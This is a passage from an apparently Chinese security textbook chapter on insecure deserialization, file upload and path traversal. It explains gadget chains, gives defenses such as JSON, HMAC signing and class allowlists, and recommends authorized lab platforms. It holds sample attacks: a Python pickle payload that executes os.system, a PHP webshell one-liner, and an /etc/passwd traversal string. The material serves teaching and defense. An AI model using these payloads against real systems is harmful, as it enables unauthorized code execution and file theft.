       ↓ 攻擊者把 callback 設成「類別 C 的物件」
  類別 C 的某方法                  →  最終呼叫了 call_user_func / eval / Runtime.exec
       ↓
  任意程式碼執行(RCE)
```

攻擊者像玩骨牌,把專案(以及框架、第三方套件)裡**現成的類別方法**一個接一個串起來,最終抵達一個「能執行任意指令」的終點。這些被串起來的現成類別,每一塊叫一個 **gadget**;串起來的整條路叫 **gadget chain**。你不需要注入任何新程式碼,**材料全是目標系統裡已經存在的類別**——你只是決定了它們的連接順序。

### 各語言的反序列化攻擊

同一個病,在各主流語言都發作,只是魔術方法和工具不同:

| 語言 | 危險入口 | 魔術方法 / 觸發點 | 攻擊者的利器 |
|------|----------|-------------------|--------------|
| **PHP** | `unserialize()` | `__wakeup`、`__destruct`、`__toString` | 手工 POP chain;PHPGGC(現成 gadget chain 產生器) |
| **Java** | `ObjectInputStream.readObject()` | `readObject`、`readResolve` | **ysoserial**(針對 Commons-Collections 等函式庫的現成 gadget chain) |
| **Python** | `pickle.loads()` | `__reduce__` | 幾乎不用 gadget——`pickle` 設計上就允許還原時執行任意呼叫 |
| **.NET** | `BinaryFormatter` 等 | 各式序列化回呼 | ysoserial.net |

Python 的 `pickle` 是最赤裸的例子,直白到能一眼看懂本質:

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        # __reduce__ 告訴 pickle:「還原我的時候,請呼叫 os.system('id')」
        # pickle 設計上就信任這個 —— 這不是 bug,是它「按設計」的行為
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())     # 產生惡意的 pickle 位元組流
# ---- 受害端 ----
# 只要對「不可信來源」的資料呼叫這一行,就直接執行 os.system('id'):
pickle.loads(payload)                 # → 執行 id 指令。反序列化 = 直接 RCE
```

Python 官方文件白紙黑字寫著:**「絕不要 unpickle 來自不可信或未經驗證來源的資料。」** 這句話其實適用於**所有**語言的原生物件序列化。

Java 則是企業級系統的重災區。`ObjectInputStream.readObject()` 一旦吃到不可信資料,配合 classpath 上存在的 gadget 函式庫(經典是 Apache Commons-Collections),用 **ysoserial** 這個工具一鍵產生 payload 就能 RCE。史上多起重大事件(含 2017 年一票企業中招、以及本質類似的 Log4Shell 概念)都跟「反序列化 / 物件還原時觸發呼叫」脫不了關係。

> **心智模型**:反序列化漏洞 = 「**把重建物件的權力,交給了不可信的人**」。你以為只是在還原一包資料,實際上你讓對方指揮了「要生成哪些物件、屬性填什麼、於是觸發哪些方法」。這跟第 08 章 SSTI(模板注入)、第 07 章 SQLi 是同一家人——**任何時候你把不可信輸入交給一個『會解讀並執行它』的引擎,就要準備好被打**。反序列化只是把「引擎」換成了「語言的物件還原機制」。

## 13.10 【防禦】反序列化:第一原則是「根本別做」

反序列化的防禦,順序非常重要——不像 SQLi 有「參數化查詢」這種漂亮的根治解,反序列化的最佳防禦是**盡量別讓自己陷入需要防的處境**。

### ① 第一原則:絕不反序列化不可信資料

這是最重要、也最常被忽略的一條。**不要對「使用者能碰到的資料」(cookie、request body、URL 參數、上傳內容、訊息佇列)做原生物件反序列化。** 問自己:這包要還原的位元組流,是不是使用者可以竄改或完全構造的?如果是,就別用 `unserialize` / `readObject` / `pickle.loads` 去吃它。

很多系統中招純粹是因為「圖方便」——把整個物件序列化後塞進 cookie 存狀態。**光是不這樣做,就消滅了絕大多數反序列化漏洞。**

### ② 改用「純資料格式」,而不是「物件序列化」

需要在通道間傳遞結構化資料時,用 **JSON、或其他只描述資料、不還原成任意物件**的格式:

```php
// ❌ 危險:序列化整個物件(還原時會觸發魔術方法、可被構造 gadget chain)
$cookie = serialize($userObject);
$obj = unserialize($_COOKIE['x']);     // 攻擊者可構造任意類別的物件

// ✅ 安全:只傳「純資料」,還原成陣列而非任意物件
$cookie = json_encode(['name' => $name, 'role' => $role]);
$data = json_decode($_COOKIE['x'], true);   // 得到的是純陣列/字串/數字,不會生出物件、不觸發任何方法
```

> **心智模型**:JSON 之所以安全,是因為它只能表達「資料」(字串、數字、陣列、布林),**沒有辦法表達『請生成一個 XXX 類別的物件』**。而原生序列化格式能——`O:6:"Logger"...` 那個 `O` 就是「請生成物件」的指令。差別正是第 07 章那條界線:**JSON 傳的是純資料,原生序列化夾帶了「行為」。** 選格式時就把攻擊面掐掉。

### ③ 非用不可時:驗完整性 + 限制可還原的類別

有些框架 / 遺留系統就是離不開原生序列化。那就疊上兩道防線:

- **完整性驗證(簽章 / HMAC 或加密)**:在序列化字串上附一個用**伺服器密鑰**算出的 HMAC 簽章;還原前先驗簽,**簽不對就拒絕還原**。這樣攻擊者無法竄改或偽造序列化資料(他沒有密鑰,算不出正確簽章)。這正是第 11 章 session / JWT 完整性保護的同一套思路。

```php
// 送出前:資料 + 用伺服器密鑰算的簽章
$payload = serialize($obj);
$sig = hash_hmac('sha256', $payload, $SERVER_SECRET);   // 只有伺服器算得出
$cookie = base64_encode($payload) . '.' . $sig;

// 還原前:先驗簽,不對就直接丟棄,連 unserialize 都不進去
[$p, $s] = explode('.', $cookie);
$p = base64_decode($p);
if (!hash_equals(hash_hmac('sha256', $p, $SERVER_SECRET), $s)) {
    die('資料完整性驗證失敗');    // 攻擊者改過內容 → 簽章對不上 → 擋
}
$obj = unserialize($p);            // 到這裡才還原,且只還原「我自己簽發過」的資料
```

- **限制可反序列化的類別(allowlist)**:即使要還原,也只允許還原「安全的、預期內的類別」,擋掉攻擊者拿來當 gadget 的那些危險類別:

```php
// PHP:第二參數限定「只允許還原這些類別」,其餘一律變成 __PHP_Incomplete_Class(不觸發 gadget)
$obj = unserialize($data, ['allowed_classes' => ['User', 'Cart']]);
```

```java
// Java 9+:用 ObjectInputFilter 建立類別白名單,只放行預期的類別,其餘拒絕還原
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*");   // 只允許 com.myapp.dto 底下的類別;其餘(!*)全拒
ois.setObjectInputFilter(filter);
```

### ④ 用語言 / 框架提供的安全替代

- **Python**:別用 `pickle` 傳不可信資料,改用 `json`;需要傳更複雜結構時用有 schema 的安全序列化(如 Protocol Buffers)。
- **Java**:優先用 JSON 函式庫(Jackson / Gson),並關掉 Jackson 的多型「default typing」(那個開了會重蹈反序列化覆轍)。
- **通則**:把「傳輸格式」和「執行能力」徹底分開——傳輸只該搬運資料,不該具備「生成任意物件、觸發任意方法」的能力。

**防禦優先序總覽**:

| 優先序 | 手段 | 定位 |
|--------|------|------|
| **1(最優先)** | 絕不反序列化不可信資料 | 從源頭消滅問題 |
| 2 | 改用 JSON 等純資料格式 | 掐掉「夾帶行為」的攻擊面 |
| 3 | HMAC 簽章 / 加密驗證完整性 | 攻擊者無法竄改或偽造 |
| 3 | 類別 allowlist(限制可還原類別) | 擋掉 gadget chain 的材料 |
| 4 | 語言安全替代 + 關危險特性 | 縱深防禦 |

> **一句話收束**:SQLi 的根治是「參數化查詢」,XSS 的根治是「輸出編碼」,反序列化的根治更乾脆——**「一開始就別把物件還原這種危險能力,交到不可信的資料手上」**。防不勝防的東西,最好的防禦是讓自己不需要防。

## 13.11 靶場練習:在授權環境動手

> **最重要的授權提醒(本章加重)**:這一章的三種漏洞,得手後都直達 **RCE / 取得系統控制權**——這在法律上是最嚴重的一類(第 00 章《刑法》§358 入侵、§359 破壞電磁紀錄)。**上傳一個 webshell、包含到 log 拿 shell、送一個惡意反序列化 payload,任何一個打在沒授權的系統上,都是「取得他人主機控制權」的鐵證,刑責遠比單純掃描重。** 只在你自己搭的靶場(第 01 章)或明確授權你攻擊的官方平台動手,一步都不能越界。

### DVWA(Damn Vulnerable Web Application)

DVWA 有兩個模組正對本章前兩個主題,而且能調難度(Low / Medium / High),看防禦怎麼一層層加上去:

| 模組 | 對應 | 練習重點 |
|------|------|---------|
| **File Upload** | 13.2–13.4 | Low:直接傳 `shell.php` 上去,連 `?c=id` 拿 RCE;調高難度後練 13.3 的繞過(Content-Type、magic bytes、雙重副檔名) |
| **File Inclusion** | 13.5–13.6 | Low:`?page=../../../../etc/passwd` 讀檔;練 `php://filter` 讀原始碼、log poisoning 升級成 RCE |

**建議練法**:每個模組都從 Low 打通,拿到 shell / 讀到檔案後,**把難度調到 High、開 View Source 看它加了什麼防禦**——通常就是 13.4 / 13.7 的白名單、`basename()`、內容驗證。這是「攻完想防」最直接的訓練(第 00 章學習建議)。

### OWASP Juice Shop

Juice Shop 是現代化(Angular + Node)靶場,更貼近真實:

- **檔案上傳關**:繞過型別檢查傳上不該傳的檔案;體會現代 API 上傳的過濾繞過。
- **路徑穿越 / 檔案存取關**:透過構造路徑讀到不該給你的檔案。
- 內建計分板,解出來記點,適合按部就班闖關。搭建用 Docker 最省事(可搭配本倉庫 Docker 課程 `../docker/README.md`),打壞了砍掉重來、完全隔離(第 01 章)。

### PortSwigger Web Security Academy

免費、關卡設計最扎實的線上靶場,三主題都有專門的實驗室(labs),而且**明確授權**你在其環境內攻擊(第 00 章):

- **File upload vulnerabilities**:從最基本的傳 webshell,到繞過各種檢查、`.htaccess`、polyglot、競態條件等進階題。
- **Path traversal**:各式編碼繞過、絕對路徑、null byte 的系列 labs。
- **Insecure deserialization**:PHP / Java / Ruby 的反序列化 labs,包含用現成 gadget chain 工具(ysoserial / PHPGGC)打 RCE——把 13.9 的概念真的跑一遍。

> 練習時養成第 00 章說的筆記習慣:記下「傳了什麼、伺服器怎麼反應、哪一招繞過成功、對應的防禦是什麼」。這是你日後寫滲透報告(第 23 章)的基本功。

## 13.12 本章小結

- **三條路,同一個終點 RCE**:惡意檔案上傳(放進一個能被執行的檔案)、路徑穿越 / 檔案包含(讀取或引入本不該碰的檔案)、不安全的反序列化(還原不可信資料時觸發程式碼)。它們共用第 07 章那條公式——**不可信的資料碰到了「會執行它 / 把它當路徑或物件」的機制**。
- **檔案上傳**:目標是把 webshell(如 `<?php system($_GET['c']); ?>`)放進「會被執行的目錄」拿 RCE。**黑名單必敗**(替代副檔名、大小寫、雙重副檔名、Content-Type、magic bytes、`.htaccess`/圖片馬、null byte)。防禦靠**白名單 + 驗真實內容 + 重新命名 + 存到不可執行的儲存(物件儲存最省心)+ 關目錄執行權限 + 圖片重新編碼**——其中「讓它無處可執行」最可靠,直接斬斷攻擊鏈。
- **路徑穿越 / 檔案包含**:`?file=../../../../etc/passwd` 讀任意檔,編碼繞過(`%2e%2e%2f`、`....//`、雙重編碼)又見黑名單失敗。LFI 配 **log poisoning / `php://filter` / `data://` / 圖片馬** 升級成 RCE;RFI 靠 `allow_url_include`。防禦:**固定對照表(最佳,輸入碰不到路徑)、realpath 正規化後做 base 目錄檢查、`basename()`、關 `allow_url_include`、`open_basedir`、最小權限**。
- **不安全的反序列化**:序列化 = 物件↔位元組流。危險在**還原物件會觸發魔術方法**(PHP `__wakeup`/`__destruct`、Python `__reduce__`、Java `readObject`),攻擊者用專案裡**現成類別**串成 **gadget chain** 直達 RCE(工具:PHPGGC、ysoserial)。Python `pickle` 最直白——反序列化即執行。防禦優先序:**①絕不反序列化不可信資料 ②改用 JSON 等純資料格式 ③非用不可就 HMAC 簽章驗完整性 + 類別 allowlist ④語言安全替代**。
- **貫穿全章的一句話**:**傳輸格式只該搬運資料,不該具備「執行、生成物件、決定路徑」的能力**。一旦資料能碰到會執行它的機制,危害就從「Web 漏洞」升級成「系統淪陷」。

> **下一章預告**:本章是 **Web 攻防篇(第 2 篇)的收尾**——我們已經把「透過網頁打進系統」的各種路走了一遍,而這三條路都通向同一個詞:RCE。但你有沒有想過,`exploit` 到底在底層「幹了什麼」才能讓一段輸入變成「執行任意程式碼」?第 14 章我們正式跨進**系統攻防篇(第 3 篇)**,回到更底層去看**漏洞利用的基礎**:記憶體是怎麼被搞壞的(緩衝區溢位、記憶體安全的概念)、一個 exploit 是怎麼「劫持程式的執行流程」的,以及攻防界最有名的框架 **Metasploit** 到底幫你自動化了什麼。從「打網頁」到「打二進位」,你對「執行任意程式碼」這六個字的理解會再深一層。
